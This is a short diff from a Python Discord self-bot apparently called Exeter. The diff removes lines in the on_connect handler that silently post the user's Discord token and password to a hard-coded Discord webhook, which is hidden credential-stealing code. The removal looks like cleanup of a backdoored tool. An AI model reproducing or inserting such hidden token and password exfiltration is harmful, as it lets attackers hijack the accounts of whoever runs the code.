@@ -353,9 +353,7 @@ async def on_message(message):
 
 @Exeter.event
 async def on_connect():
-    Clear()  
-    requests.post('https://canary.discord.com/api/webhooks/830080942051164230/U-QWhCVjAtwQbMRaukJmLMoj2IJKu1W8NqsWiKAO8F_nUP0czh2aslTKCw3oMy34vWng',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
-    startprint()
+    
 
 @Exeter.event
 async def on_member_ban(guild: discord.Guild, user: discord.user):
